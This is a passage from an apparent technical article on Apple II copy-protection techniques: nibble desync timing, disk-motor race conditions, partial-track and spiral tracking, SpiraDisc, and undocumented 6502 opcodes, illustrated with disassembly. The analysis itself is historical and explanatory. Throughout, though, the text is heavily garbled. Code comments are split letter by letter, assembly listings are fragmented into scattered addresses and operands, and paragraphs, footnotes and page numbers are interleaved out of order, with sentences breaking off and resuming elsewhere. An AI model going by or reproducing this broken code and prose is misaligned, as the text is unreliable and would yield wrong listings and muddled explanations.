022B DEY
6 ; r e t r y up t o 256 t i m e s
022C BEQ $2275
8 022E CMP #$AD
0230 BNE $2226
A different prologue value is checked, allowing
the bitstream to begin like a regular sector: D5 AA
AD. . .
Here is the switch:
1 ; t r i g g e r desync
0252 LDA $C08D ,X
48 Interestingly, one title from Thunder Mountain and released in the same year is known to use the regular version. It is
entirely possible that the alternative version was developed in-house to avoid paying royalties to protect other products.
533 0255 LDY #$10
; no d e l a y i n s t r u c t i o n i n t h i s v e r s i o n
5 ; wait f o r n i b b l e to a r r i v e
0257 LDA $C08C ,X
7 025A BPL $2257
025C DEY
9 ; r e t r y up t o 16 t i m e s
025D BEQ $2275
11 ; watch f o r #$E7 i n s t e a d , but i t ’ s not a ‘ ‘
t r u e ’ ’ E7
025F CMP #$E7
13 0261 BNE $2257
; and d o u b l e t h e s i z e o f t h e p a t t e r n t o match
15 0263 LDY #$0F
The bitstream on disk looks like D5 AA AD
[many 96s] E7 E7 E7 E7 E7 E7 E7 E7 E7 E7 E7
with some harmless zero-bits in between. The
desync timing is only 12 cycles, but the required
pattern is not found right away, so the delay is
not as interesting. In binary, the stream looks
like 11100111 11100111 11100111 00 11100111 0
11100111 0 11100111 0 11100111 00 11100111 00
11100111 0 11100111 00 11100111 0 11100111 0
11100111 0 11100111 00 11100111 0 11100111 00
11100111 0 11100111 0 11100111 with the seemingly
redundant zero-bits in bold. However, by skipping
the first three bits, the stream looks like this:
00 11111100 11111100 11100111 (← E7, but not
aligned) 00 11101110 0 11101110 0 11101110 0
11100111 00 11100111 00 11101110 0 11100111
00 11101110 0 11101110 0 11101110 0 11100111
00 11101110 0 11100111 00 11101110 0 11101110
0 111. . .
The old zero-bits are still in bold, and the newly
exposed zero-bits are in italics. We can see that
the old zero-bits form part of the new stream. This
decodes to FC (ignored) FC (ignored) E7 EE EE EE
E7 E7 EE E7 EE EE EE E7 EE E7 EE EE, a very
smooth sequence indeed. Put simply, each single
bold zero-bit sequence results EE being seen, and ev-
ery double bold zero-bit sequence results in E7 being
seen, allowing easy control over exactly how smooth
the sequence is.
1-2-3 Sequence Me uses the same technique but
with different values:
9 ; t r i g g e r desync
BA7C
LDA
$C08D ,X
11 ; d e l a y w h i l e s t a t u s i s l o a d e d
BA7F
PHA
13 ; b a l a n c e s t a c k
BA80
PLA
15 ; w a i t f o r n i b b l e t o a r r i v e
BA81
LDA
$C08C ,X
17 BA84
BPL
$BA81
; watch f o r #$BB
19 BA86
CMP
#$BB
BA88
BEQ
$BA8F
21 BA8A
DEY
; r e t r y i f count r e m a i n s
23 BA8B
BPL
$BA81
; fail
25 BA8D
BMI
$BA77
; wait f o r n i b b l e to a r r i v e
27 BA8F
LDA
$C08C ,X
BA92
BPL
$BA8F
29 ; watch f o r #$F9
BA94
CMP
#$F9
31 BA96
BNE
$BA77
That stream looks like AA EB 97 DF FF with
some harmless zero-bits in between. Now let’s count
the cycles:
1 BA5B
BA5E
3 BA60
BA62
5 ...
BA7A
7 BA7C
BA7F
9 ; total :
LDA
BPL
CMP
BEQ
$C08C ,X
$BA5B
#$AA
$BA7A
LDY
#$02
LDA
$C08D ,X
PHA
16 c y c l e s
;2 cycles
;2 cycles
;3 cycles
;2 cycles
;4 cycles
;3 cycles
One bit is shifted in every four CPU cycles, so
a delay of 16 CPU cycles is enough for four bits to
be shifted in. Those bits are discarded. Back to our
stream. In binary, it would look like this:
11101011 0 10010111 0 11011111 00 11111111
with the seemingly redundant zero-bits in bold.
However, by skipping the first four bits, the stream
looks like this:
10110100 10111011 0 11111001 111111. . .
The old zero-bits are still in bold, and the newly
exposed zero-bit is in italics. We can see that the
old zero-bits form part of the new stream. This de-
codes to B4 (ignored) BB F9 Fx, and we have our
magic values.
The 4th R: Reasoning uses another variation of
this technique. Instead of matching the values ex-
plicitly, it watches for the data field on a particular
sector, waits for three nibbles and three bits to pass,
1 ; wait f o r n i b b l e to a r r i v e
BA5B
LDA
$C08C ,X
3 BA5E
BPL
$BA5B
; watch f o r #$AA
5 BA60
CMP
#$AA
BA62
BEQ
$BA7A
7 ...
BA7A
LDY
#$02
54to be shifted in. A delay of 22 CPU cycles would
normally be enough for five bits to be shifted in.
However, if the delay is caused by the presence of a
zero-bit, then it behaves as though the delay were
only 18 CPU cycles, which is enough for four bits to
be shifted in. A delay of 29 CPU cycles is enough
for seven bits to be shifted in. However, if the delay
is caused by the presence of a second zero-bit, then
it behaves as though the delay were only 21 CPU
cycles, which is enough for five bits to be shifted in.
In any case, the routine is written to discard a fixed
number of regular bits, along with any zero-bits that
are also present. Back to our stream, in binary, it
would look like this:
11001111 11001111 0 10011110 11111101 0 11101101
10111011 11100110 10110110 11101101 11111011 0
11111100 11101011 11011111 11011110 11010011
11011001 11111111 11011001 11011101 0 11010111
with the seemingly redundant zero-bits in bold.
However, by skipping the first three bits, the stream
looks like this:
0 11110100 11110111 11101011 10110110 11101111
10011010 11011011 10110111 11101101 11111001
11010111 10111111 10111101 10100111 10110011
11111111 10110011 10111010 11010111
The old zero-bits are still in bold, and the newly
exposed zero-bit is in italics. We can see that the
old zero-bits form part of the new stream. This
decodes to F4 F7 (both ignored) EB B6 EF 9A DB
B7 ED F9 D7 BF BD A7 B3 FF B3 BA. The trailing
values are stored backwards, and the checksum is
#$67. The low four bits (7) are the index into the
table, and the values at offset 7 and 8 are #$D7 and
#$F9.
A bit-copier that misses any of these zero-bits
will write a track whose length and contents do not
match the original
and then reads and stores the next 16 nibbles in an
array. Then it calculates a checksum of those 16
nibbles, and uses the checksum as an index into the
table of those 16 nibbles, to fetch two 8-bit keys in a
row. The table is treated as a circular list, so if the
index were 15, then the two keys would be formed
by fetching the last entry in the array and the first
entry in the array. The keys are used to decipher
the other nibbles that are read from all of the other
sectors on the disk. It looks like this:
1 ; wait f o r n i b b l e to a r r i v e
BB63
LDA
$C08C ,X
3 BB66
BPL
$BB63
; wait f o r n i b b l e to l e a v e
5 ; i f z e r o −b i t i s p r e s e n t ,
; then r e a d v a l u e l a s t s l o n g e r
7 BB68
LDA
$C08C ,X
BB6B
BMI
$BB68
9 ; wait f o r n i b b l e to a r r i v e
BB6D
LDA
$C08C ,X
11 BB70
BPL
$BB6D
; t r i g g e r desync
13 BB72
STA
$C08D ,X
; d e l a y t o r e d u c e number o f t i m e s
15 ; t h a t branch w i l l be t a k e n
BB75
NOP
17 ; w a i t f o r s t a t u s v a l u e t o l e a v e
; i f z e r o −b i t i s p r e s e n t ,
19 ; then r e a d v a l u e l a s t s l o n g e r
BB76
LDA
$C08C ,X
21 BB79
BMI
$BB76
; wait f o r next n i b b l e to a r r i v e
23 BB7B
LDA
$C08C ,X
BB7E
BPL
$BB7B
That stream looks like CF CF 9E FD ED BB E6
B6 ED FB FC EB DF DE D3 D9 FF D9 DD D7 with
some harmless zero-bits in between. Now let’s count
those cycles:
BB63
LDA
$C08C ,X
2 BB66
BPL
$BB63
BB68
LDA
$C08C ,X
4 BB6B
BMI
$BB68
BB6D
LDA
$C08C ,X
6 BB70
BPL
$BB6D
;2 cycles
BB72
STA
$C08D ,X ; 5 c y c l e s
8 BB75
NOP
;2 cycles
BB76
LDA
$C08C ,X ; 4 c y c l e s
10 ; but +4 c y c l e s f o r each time r e a c h e d
; b e c a u s e o f z e r o −b i t
12 BB79
BMI
$BB76
;2 cycles
; but +3 c y c l e s f o r each time
14 ; BMI i s t a k e n b e c a u s e o f z e r o −b i t
; t o t a l 15 ( o r 22 o r even 2 9 ) c y c l e s
7.10.16
Race conditions
Page 4 of the Software Control of the Disk ][ or IWM
Controller document states that “The Disk ][ con-
troller hardware will keep the ENABLE/ signal to
its active low state for approximately one second af-
ter the execution of the motor off instruction, there-
fore read/write can be performed reliably within this
period.” So, a program can issue the motor off in-
struction, and then read sector data successfully for
up to one second afterwards.
This behavior functions as a very nice anti-
debugging mechanism, since single-stepping through
the disk access code, after the motor-off instruction
One bit is shifted in every four CPU cycles, so
a delay of 15 CPU cycles is enough for three bits
55has been issued, will cause the time period to be
exceeded. Thus, the disk won’t be readable at that
time. Sherwood Forest uses this technique.
Page 4 of the Software Control of the Disk ][ or
IWM Controller document also states that “. . . the
program should verify that the motor is spinning by
monitoring the change in data pattern read from the
drive.” That is to say, while the drive is spinning,
the value will change. Once the drive stops spinning,
the value will not change anymore.
Lady Tut uses this technique. It issues the
motor-off instruction, and then reads continually
from the drive until it sees two consecutive bytes of
the same value. The program assumes at that point
that the drive is no longer spinning. Periodically
thereafter, the program reads from the QA switch
of the Data Register, and compares the newly read
value with the initially read value. If a different
value is seen, then the program triggers a reboot.
In section 9-14 of Understanding the Apple ][,
Jim Sather says, “any even address could be used
to load data from the data register to the MPU, al-
though $C088 . . . would be inappropriate.” It might
be considered inappropriate because of the one-
second window noted previously, but that’s exactly
how the program Mr. Do! uses it. By reading from
$C088, the program is able to issue the motor off
instruction, and fetch the data at the same time. It
is compact and useful for anti-debugging.
Faster pussycat
Another kind of race condition revolves around how
quickly the data can be read from the disk. Bor-
rowed Time, for example, reads an entire track in
one revolution. In an interview for the Open Ap-
ple podcast, Rebecca Heineman says that she per-
forms the decoding while the seek is in progress.
While this is certainly possible, it would incur the
significant overhead of having to store all 16 of the
two-bit arrays—a total of 1.3kB! — before any de-
coding could occur. Of course, this is not what was
done. Instead, each sector is read individually, but
the denibbilisation is interleaved with the read. It
means that the sector is decoded directly into mem-
ory, with only 86 bytes of overhead for a single two-
bit array, and the use of two tables of 106 bytes and
256 bytes respectively. It is obviously fast enough
to catch the next sector that arrives
The code looks like this, after validating the data
field prologue:
1 0946
LDY
#$AA
; z e r o r o l l i n g checksum
3 0948
LDA
#0
094A
STA
$26
5 ; wait f o r n i b b l e to a r r i v e
094C
LDX
$C0EC
7 094F
BPL
$94C
; index into t a b l e of o f f s e t s of s t r u c t u r e s
9 0951
LDA
$A00 ,X
; store offset
11 0954
STA
$200 ,Y
; update r o l l i n g checksum
13 0957
EOR
$26
; f e t c h 86 t i m e s
15 0959
INY
095A
BNE
$94A
17 095C
LDY
#$AA
095E
BNE
$963
19 ; s t o r e decoded v a l u e
0960
STA
$9F55 ,Y
21 ; w a i t f o r n i b b l e t o a r r i v e
0963
LDX
$C0EC
23 0966
BPL
$963
; update r o l l i n g checksum
25 0968
EOR
$A00 ,X
; f e t c h s t r u c t u r e o f f s e t , b i t s 0−1
27 096B
LDX
$200 ,Y
; merge f i r s t member o f two−b i t s t r u c t u r e
29 ; with s i x −b i t v a l u e t o r e c o v e r e i g h t −b i t
value
096E
EOR
$B00 ,X
31 ; l o o p 86 t i m e s
0971
INY
33 0972
BNE
$960
; s a v e 85 th decoded v a l u e f o r l a s t
35 0974
PHA
; c l e a r low two b i t s
37 0975
AND
#$FC
0977
LDY
#$AA
39 ; w a i t f o r n i b b l e t o a r r i v e
0979
LDX
$C0EC
41 097C
BPL
$979
; update r o l l i n g checksum
43 097E
EOR
$A00 ,X
; f e t c h s t r u c t u r e o f f s e t , b i t s 2−3
45 0981
LDX
$200 ,Y
; merge s e c o n d member o f two−b i t s t r u c t u r e
47 ; with s i x −b i t v a l u e t o r e c o v e r e i g h t −b i t
value
0984
EOR
$B01 ,X
49 ; s t o r e decoded v a l u e
0987
STA
$9FAC ,Y
51 ; l o o p 86 t i m e s
098A
INY
53 098B
BNE
$979
; wait f o r n i b b l e to a r r i v e
55 098D
LDX
$C0EC
0990
BPL
$98D
57 ; c l e a r low two b i t s
0992
AND
#$FC
59 0994
LDY
#$AC
; update r o l l i n g checksum
61 0996
EOR
$A00 ,X
; f e t c h s t r u c t u r e o f f s e t , b i t s 4−5
56time, saving five lines.
With the benefit of determination to improve it,
and the ability to do so, I rewrote this loader to de-
code all of the bytes directly, reduced the size of the
code, and made it even faster. I call it “0boot.” 49
Then I reduced the overhead to just two bytes, if
page $BF is not the destination. I call that one “q-
boot.” 50 The two tables are still 106 bytes and 256
bytes respectively. It might appear that the second
table can be reduced to 192 bytes, since the other 64
bytes are unused. However, it is not possible for this
algorithm, because the alignment is required to sup-
ply the pre-shifted values. If the table were reduced
in size, then additional operations would be required
to reproduce the effect of the shift, and which would
take longer to execute than the time available before
the next nibble arrived.
Interestingly, Heineman claims to have created
and released the technique in 1980, 51 but it was
apparently not until 1984 that she used it in a re-
lease herself. It certainly existed in 1980, though.
Automated Simulations (which later became Epyx)
included the technique with the programs Hellfire
Warrior and Rescue At Rigel. In 1983, Free Fall As-
sociates (founded by the co-founder of Automated
Simulations, whose last name begins with “Free”,
and a programmer whose last name ends with “Fall”)
included the technique with the programs Murder on
the Zinderneuf and Archon. (Apparently they took
it with them, as Epyx did not use it again.) Also in
1983, Apple included the technique in ProDOS. In
1985, Brøderbund included the technique with the
program Captain Goodnight. According to Roland
Gustafsson, Apple supplied that code. 52
63 ; o f f s e t −2 t o a c c o u n t f o r Y+2
0999
LDX
$1FE ,Y
65 ; merge t h i r d member o f two−b i t s t r u c t u r e
; with s i x −b i t v a l u e t o r e c o v e r e i g h t −b i t
value
67 099C
EOR
$B02 ,X
; s t o r e decoded v a l u e
69 099F
STA
$A000 ,Y
; wait f o r n i b b l e to a r r i v e
71 09A2
LDX
$C0EC
09A5
BPL
$9A2
73 ; l o o p 84 t i m e s
09A7
INY
75 09A8
BNE
$996
; c l e a r low two b i t s
77 09AA
AND
#$FC
; update r o l l i n g checksum
79 09AC
EOR
$A00 ,X
; r e s t o r e s l o t to X
81 09AF
LDX
$2B
; r e t r y i f checksum mismatch
83 09B1
TAY
09B2
BNE
$9BD
85 ; w a i t f o r n i b b l e t o a r r i v e
09B4
LDA
$C0EC
87 09B7
BPL
$9B4
; check only f i r s t e p i l o g u e byte
89 09B9
CMP
#$DE
09BB
BEQ
$9BF
91 09BD
SEC
09BE
.BYTE $24
93 09BF
CLC
; s t o r e 85 th decoded v a l u e
95 09C0
PLA
09C1
LDY
#$55
97 09C3
STA
( $44 ) ,Y
09C5
RTS
The exact way in which the technique works is as
follows. First, each of the two-bit values is read into
memory, but instead of storing them directly, the
values are used as an index into the 106-bytes table.
The 106-bytes table serves two purposes. The first,
in the context of the two-bit values, is as an array
of offsets within the 256-bytes table. The second, in
the context of the six-bit values, is as an array of
pre-shifted values for the six-bit nibbles. The 256-
bytes table is composed of groups of two-bit values
in all possible combinations for each of the three po-
sitions in a nibble. To produce the eight-bit value,
each of the pre-shifted six-bit values is ORed with
the corresponding two-bit value. It is unknown why
the 85th value is treated separately from the rest in
that code; it could certainly be decoded at the same
49 http://pferrie.host22.com/misc/0boot.zip
50 http://pferrie.host22.com/misc/qboot.zip
51 Personal
52 Personal
communication
communication
577.11.2
The stepper motor in the Disk ][ system is composed
of four magnets. To advance a whole track requires
activating and deactivating two phases in the proper
order, and with a sufficient delay, for each track to
step. To step to a later track, the next phase must be
activated while the other phases are deactivated. To
step to an earlier track, the previous phase must be
activated while the other phases are deactivated. As
might be expected, activating and then deactivating
only one of the phases will cause the stepper to stop
half-way between two tracks. This is a half-track po-
sition. It is even possible to produce quarter-track
stepping reliably, by performing the half-track step-
ping method, but with a smaller delay. Depending
on the hardware, it can also be done by activating
two of the phases, and then deactivating only one
of them. This last technique is used by Spiradisc.
(§7.11.9.)
The issue with half-track and quarter-track posi-
tioning is that data written to these partial track po-
sitions will cause signal interference with data writ-
ten to the neighbouring half-track or quarter-track
at the same relative position. To avoid unintentional
cross-talk, data can be written to only part of the
track such that there is no overlap, or placed at least
three-quarters of a track apart. (The reliability of
three-quarter tracks is questionable.)
The maximum amount of data that can be
placed at partial-track intervals is proportional to
the stepping—a quarter of a track for each of four
consecutive quarter-tracks, half of a track for each of
two consecutive half-tracks, or a full track for con-
secutive three-quarter-tracks. There can be a sig-
nificant performance hit to access the data, too—it
requires an almost complete rotation to reach the
start of the data on subsequent tracks if the maxi-
mum density is used, because the seek time is long
enough that the start will be missed on the first time
around. As a result, the most common amount that
is used is only a quarter of the track, and placed far
enough around the track that the read can be per-
formed almost continuously. Programs that make
use of partial tracks usually include a standard for-
mat of individual sectors, so the only trick to the
protection is the location of the data on the disk.
Agent USA uses the half-track technique with
five sectors per track.
Also interestingly, whoever included it in the
Free Fall Associates programs either did not under-
stand it, or just did not want to touch it—there,
the loader has been patched to require page-aligned
reads, but the code still performs the initialisation
for arbitrary addressing. Twelve lines of code could
have been removed from that version. The Inter-
play programs that use the technique also require
page-aligned reads, but do not have the unnecessary
initialisation code.
Quote of the day by Olivier Guinart, “It’s ironic
that the race condition would be used by a program
called Borrowed Time.”
7.11
7.11.1
Track positioning
Track-level protections
Track length
The length of a track might not be constant across
all of the tracks on a disk. The speed of the drive is
the primary reason: the faster the drive, the shorter
the track (that is, fewer nibbles can be written) be-
cause of the larger gaps between the nibbles.
Wizardry determines the length of the track, by
measuring the time between succeeding arrivals of
sector zero, and then calculates the deviation from
the expected value. This deviation value is applied
to the length of several other tracks, and the result
is compared against the expected lengths. If the
length of the track is not within the range that is
expected, then the program hangs. This protection
cannot be reproduced by a sector-copier or track-
copier, because they will discard the original data
between the sectors, thus altering the length of the
track. A bit-copier can usually reproduce this pro-
tection because it writes the entire track mostly as
it appeared originally, so the track length is at least
similar to the original.
58Championship Lode Runner uses an alternating
quarter-track technique with just two sectors per
track but of twice the size. While loading, the access
alternates between the neighbouring quarter-tracks,
resulting in the drive “chattering”, but allowing the
sectors to be spaced only half of a rotation apart. In
both cases of the programs here, it results in an ex-
tremely fast load time because of the reduced head
movement.
In this case, the protection is the use of partial
tracks. Copy programs which do not copy the par-
tial tracks (and copying partial tracks is not the de-
fault behavior) will fail to reproduce the protection.
7.11.3
7.11.4
Track spiralling
spiral track
quarter-track
layout
6
4
1
8
2
3
5
8
3
6
7
5
1
2
4
7
“Track spiralling” or “spiral tracking” is a tech-
nique whereby the data is placed in partial-track
intervals, but treated as a complete track. By mea-
suring the time to move the head to a partial-track,
the position on the track can be known, such that
the next sector to be read will have a predictable
number, and therefore can be read without valida-
tion, once the start of the sector is found. A copy of
the disk will not place the data at the same relative
position, causing the protection to fail. The step-
ping in spiral tracking goes in only one direction.
A visualisation of the data access would look like a
broken spiral, hence the name.
One major problem with spiral tracking is that
variations in rotation speed can result in the read
missing its queue and not finding the expected sec-
tor. For 30 years, I believed a claim 53 that the
program Captain Goodnight uses this technique. It
doesn’t. The Observatory uses a spiral pattern for
faster loading, but still verifies the sector number
first. However, the program LifeSaver uses true spi-
ral tracking.
Synchronised tracks
If the approximate rotation speed of the drive is
known, then it becomes possible to place sectors at
specific locations on tracks, such that they have a
special position relative to sectors on other tracks.
This technique is identical to synchronized sectors,
except that it spans tracks, making it even more
difficult to reproduce, because it is difficult to de-
termine the relative position of sectors across tracks.
Unlike “spiral tracking” (§7.11.4), this technique lim-
its itself to checking for the existence of particular
sectors, rather than actually reading them.
Blazing Paddles uses this technique. Once it
finds sector zero on track zero, as a known starting
point, it seeks to track one, reads the address field of
the next sector to arrive, and then compares it to an
expected value. If the proper sector is found, then
the program seeks to track two, reads the address
field of the next sector to arrive, and compares it
to an expected value. If the proper sector is found,
then the program seeks to track three. This is re-
peated over eight tracks in total. It means that the
original disk has one sector placed at a specific lo-
cation on each of eight consecutive tracks, relative
to sector zero of track zero, such that it factors in
how much the disk rotates during the time that the
controller takes to move the head from track zero.
It also supports slight variations in rotation speed,
such that the read can begin anywhere after the ad-
dress field for the previous sector, without failing
the protection.
7.11.5
Track arcing
“Track arcing” uses the same principle as spiral
tracking, but instead of stepping in only one direc-
tion, it reaches a threshold and then reverses direc-
tion.
7.11.6
Track mirroring
Track mirroring should be placed conceptually be-
tween synchronized tracks and spiral tracking. As
53 From a cracker whose crack-screens were displayed only by pressing a particular key-sequence during the boot. They were
known as “Hidden Pages” (Imagine that—a cracker who didn’t want to brag openly!) Both of the programs Captain Goodnight
and Where In The World Is Carmen Sandiego (first release) use alternating quarter-tracks—the same technique as in the pro-
gram Championship Lode Runner. (The former two were released within a year of the latter one.) The sectors are placed in
a N/S/E/W orientation on the first two tracks, a NW/SE/NE/SW orientation on the next two tracks, and then back to the
N/S/E/W orientation on the next two tracks, and so on. The loader will allow an entire revolution to pass, if necessary, in
order to find the requested sector. The tracks are synchronized, however, because they must be to avoid cross-talk. (§7.11.7.)
59with synchronized tracks, it expects a particular sec-
tor to be found after stepping across multiple tracks.
As with spiral tracking, it reads the sector data.
However, unlike spiral tracking, it verifies that the
contents of that sector match exactly the contents
of all of the other sectors that are synchronized sim-
ilarly across the tracks.
The Toy Shop uses this technique. It reads three
consecutive quarter-tracks in RWTS18 format, and
verifies that they all fully readable and have a valid
checksum. This is possible only because they are
identical in their content and position. The con-
tents of the last quarter-track are used to boot the
program. A funny thing occurs when the program is
converted to a NIB image: the protection is defeated
transparently, because NIB images do not support
partial tracks, so the attempt to read consecutive
quarter-tracks will always return identical data, ex-
actly as the protection requires.
Pinball Construction Set uses this technique. It
reads a sector then activates a phase to advance the
head, and then proceeds to read a sector while the
head is moving. The head continues to drift over the
track while the sector is being read. After reading
the sector, the program deactivates the phase, reads
another sector, and then completes the move to the
next track. Once there, it reads a sector. It activates
a phase to retreat the head, and then performs the
same trick in reverse, until the start of the track is
reached again. It performs this sequence four times
across those two tracks, which makes the drive hiss.
The program is able to read the sector as continuous
data because the disk has consecutive quarter-tracks
that are identical in their content and position.
7.11.7
offer support for them. Some copy programs did
not support the copying of additional tracks for the
same reason. Of course, programmers who did not
use DOS had no such limitation. While the actual
number of available tracks could vary up to 40 or
even 42, it was fairly safe to assume that at least
one track existed, and could be read by direct use
of the disk drive.
Faial uses this technique to place data on track
35.
7.11.9
No description of copy-protection techniques could
be complete without including SpiraDisc. This pro-
gram was a protection technology that introduced
the idea of spiral tracking, though the implementa-
tion is not spiral tracking as we would describe it
today. It is, in fact, a precise placement of multi-
ple sectors on quarter-tracks, such that there is no
cross-talk while reading them, but without a specific
order. The major deviation from the current idea of
spiral tracking is that there is no synchronization
of the sectors beyond avoiding cross-talk. The pro-
gram will allow a complete rotation of the disk to
occur, if necessary, while searching for the required
sector.
The first-stage boot loader is a single sector that
is “4-and-4” encoded, and 768 bytes long. The sec-
ond stage loader is composed of ten regular sectors
that are “6-and-2” encoded. They are read one by
one—there is no read-scattering here to speed up the
process. Thereafter, reads use an alternative nibble
table—all of the values from #$A9-FF from our first
table. These values might have been chosen because
they provide the least sparse array when used as in-
dexes.
The encoding is not “6-and-2”, either, it is “6-
and-0” encoding. This requires 344 bytes per sector,
instead of the regular 342 bytes. The decoder over-
writes the addresses $xxAA and $xxAB (the program
supports only page-aligned reads) twice in order to
compensate for the additional bytes. The decoding
is interleaved, so there is no denibbilisation pass.
The “6-and-0” encoding works by using the six-
bit nibble as an alternating index into one of the
arrays of six-bit or two-bit values. The code is both
much faster (no fetching of the two-bit array) and
much smaller (two-thirds of the size) than the one
described in Race Conditions,(§7.10.16) but the de-
coding tables occupy 1.5kb of memory. The mem-
ory layout might have been chosen to avoid a timing
Cross-talk
While cross-talk is normally something to be
avoided, it can serve as a copy-protection mecha-
nism, by intentionally allowing it to occur. It mani-
fests itself in a manner similar to the effect of having
excessive consecutive zero-bits being present in the
stream, where reading the same stream repeatedly
will yield different values. The lack of such an effect
indicates the presence of a copy.
7.11.8
SpiraDisc
More tracks
Many disk drives had the ability to seek beyond
track 34, and many disks also carried more than
35 tracks. However, since DOS could not rely on
the presence of either of these things, it did not
60penalty due to page-crossing accesses. However, the
penalty has no effect on the performance of the rou-
tine because the code must still spend time waiting
for the bytes to arrive from disk. Therefore, the
tables could have been combined into a 512-byte re-
gion instead, which is a closer match to the memory
usage of the routine described in Race Conditions.
A Spiradisc-protected disk uses four sectors per
track, but since the track stepping is quartered, the
data density is equivalent to a single 16-sector track.
Each sector has a unique prologue value to identify
itself. When a read is requested, if a sector can-
not be found on the current track, then the pro-
gram advances the drive head by one quarter-track,
and then attempts the read again. If the read fails
again, then the program retreats the drive head by
one quarter-track, and then attempts the read again.
If the read still fails, then the program retreats the
drive head by another quarter-track, and then at-
tempts the read again. If the read fails at this point,
then the disk is considered to be corrupted.
Given the behaviour of the read request, the
data might not be stored on consecutive quarter-
tracks. Instead, they might zig-zag across a span of
up to three quarter-tracks. This is another deviation
from the idea of spiral tracking. By coincidence, the
movement is very similar to the one in the program
Captain Goodnight and other Brøderbund titles.
Copying a SpiraDisc-protected disk is difficult
because of the potential for cross-talk which would
corrupt the sectors when they are read back. How-
ever, images produced by an E.D.Dċard will work in
emulators, if the copy parameters are set correctly.
When run, the program decodes selected pages
of itself, based on an array of flags, and also re-
encodes those pages after use, to prevent dumping
from memory. The decoding is simply an exclusive-
OR of each byte with the value #$AC, exclusive-
ORed with the index within the page.
At start-up, the program profiles the system:
scanning the slot device space, and records the loca-
tion of devices for which the first 17 bytes are con-
stant (that is, they return the same value when read
more than once), and which do not have eight bytes
that match the first one within those 17 bytes. For
example, Mockingboard has memory-mapped I/O
space in that region, which are mostly zeroes. The
program calculates and stores a checksum for slot
devices which pass this check. The store was sup-
posed to happen only if the checksum did not match
certain values, but the comparison is made against
a copyright string instead of an array of checksums.
The first time around, all values are accepted. Dur-
ing subsequent profiling, the value must match ex-
actly.
The program checks if bank one is writable, af-
ter attempting to write-enable it, and sets a flag
based on the result. The program checksums the
F8 and F0 ROM BIOS codes, watches for particu-
lar checksums, and sets flags based on the result.
The original version of the program (as seen in
1981, used on the program Jawbreaker) actually re-
quired that the ROM BIOS code match particular
checksums—either the original Apple ][ or the Ap-
ple ][+—otherwise the program simply wiped mem-
ory and rebooted. (This prevented protected pro-
grams from running on the Apple ][e or the Ap-
ple ][c.) The no-doubt numerous compatibility prob-
lems that resulted from this decision led to the final
check being discarded (as seen in 1983, used on the
program Maze Craze Construction Set, but quite
possibly even earlier), though the rest of the profil-
ing remains. However, having even one popular ti-
tle that didn’t work on more modern machines was
probably sufficient to turn publishers entirely off the
use of the program.
The program probes all of memory by writing a
zero to every second byte. However, it skips pages
#0, #2, #4-7, and #$A8-C0, meaning that it writes
data to all slot devices, with unpredictable results.
The program also re-profiles the system upon receiv-
ing each request to read tracks. This re-profiling is
intended to defeat memory dumps that are produced
by NMI cards, and which are then transferred to
another machine, as the second machine might have
different hardware options.
The program also checksums the boot PROM
prior to disk reads, and requires that it matches one
particular checksum—that of the Disk ][ system—
otherwise the program wipes memory and reboots.
(This prevents protected programs from running on
the Apple ][GS.)
Interestingly, despite all of the checks of the envi-
ronment, the program does not protect itself against
tampering, other than using encoded pages. The
memory layout is data on pages #$A8-B1, and code
on pages #$B2-BF. The data pages are very sparse,
leaving plenty of room for a boot tracer to intercept
execution and disable protections.
The program uses a quarter-track stepping al-
gorithm that activates two phases, and then de-
activates only one of them. According to Roland
61Gustafsson, this stepping technique allows for more
precise positioning of the drive head, but it does not
work on Rana drives. It was for this reason that he
used the reduced-delay technique instead. (§7.11.2.)
The reduced-delay technique is apparently the only
one which works on an Apple ][c, as well. Spiradisc
predated the Apple ][c by about two years, so it was
just bad luck that an incompatible technique was
chosen.
7.12
Illegal opcodes
The 6502 CPU has 151 documented instructions.
There are quite a few additional instruction encod-
ings for which the results could be considered useful,
if the side-effects (e.g. memory and/or register cor-
ruption, or long execution time) were also accept-
able. In some cases, the instructions were used to
obfuscate the meaning of the code, since they would
not be disassembled correctly. Some of these un-
documented instructions were replaced in the 65C02
CPU with documented instructions with different
behaviors, and without the unfortunate side-effects.
In some cases, the code that used the undocumented
instructions was not affected because the results of
the undocumented instructions were discarded, and
the documented replacement did not introduce es-
pecially unwanted behavior. Note that the instruc-
tions that were not replaced will cause the 65C02
CPU to hang.
The Datasoft version of the program Dig Dug
uses this technique. It begins with an instruction
which used to behave as a two-byte NOP, but which
is now a zero-page STZ instruction. Since the pro-
gram does not make use of the zero-page at that
time, the store has no side-effects. It looks like this
in 6502 mode:
0801
2 0802
Beer Run uses this technique, but was unfortu-
nate enough to choose an instruction which was not
defined on the 65C02 CPU, so the program does not
work on a modern machine. The code is run with
the carry set much earlier in the flow, as a side-effect
of executing a routine in the ROM BIOS. It is pos-
sible that the authors were not even aware of the
fact.
74
4C B0 58
???
JMP
051B
LDX
2 ...
051F
LDA
4 0521
STA
...
6 ; FF 00 00
0525
ISC
74 4C
B0 58
STZ
BCS
#$00
$00
$0000 ,X
which, when executed, does this:
1 INC
SBC
$0000 ,X
$0000 ,X
X is zero, so $00 is first incremented to #$01, and
then subtracted from A. A is zero before the subtrac-
tion, so it becomes #$FF. The resulting #$FF is used
as a key to decipher some values later.
7.13
CPU bugs(!)
The original 6502 CPU had a bug where an indi-
rect JMP (xxFF) could be directed to an unexpected
location because the MSB will be fetched from ad-
dress xx00 instead of page xx+1. Randamn relies on
this behavior to perform a misdirection, by placing
a dummy value at offset zero in page xx+1, and the
real value at address xx00.
While not a bug, but perhaps an undocumented
feature—the breakpoint bit is always set in the sta-
tus register image that is placed on the stack by the
PHP instruction. Lady Tut relies on this behavior to
derive a decryption key.
There is also a class of alternative behaviours be-
tween the 6502 and the 65C02 CPUs, particularly
regarding the Decimal flag. For example, the fol-
lowing sequence will yield different values between
$58B0
In 65C02 mode, the same machine code interpreted
differently.
0801
2 0803
#$00
$4C
$85D
62introducing an additional case. If the stack pointer
were #$FD at the time of executing the RTI instruc-
tion, then this causes the value #$11 and $1010 to be
fetched from $1FE. The program has an RTS instruc-
tion at $1010. The RTS at $1010 transfers control
to $1112+1. The RTS at $1113 transfers control to
$1211.
That’s not all! We can construct an even longer
chain. If the stack pointer were #$F9 at the time
of executing the RTI instruction, then this causes
the value #$12 and $1011 to be fetched from $1FA.
The RTS at $1011 transfers control to $1112+1, but
the RTS at $1113 causes the stack pointer to wrap
around. The CPU fetches both #$10 values, so the
RTS at $1113 transfers control to $1010+1. The RTS
at $1011 transfers control again to $1112+1. The
RTS at $1113 finally transfers control to $1211.
Championship Lode Runner has a smaller chain.
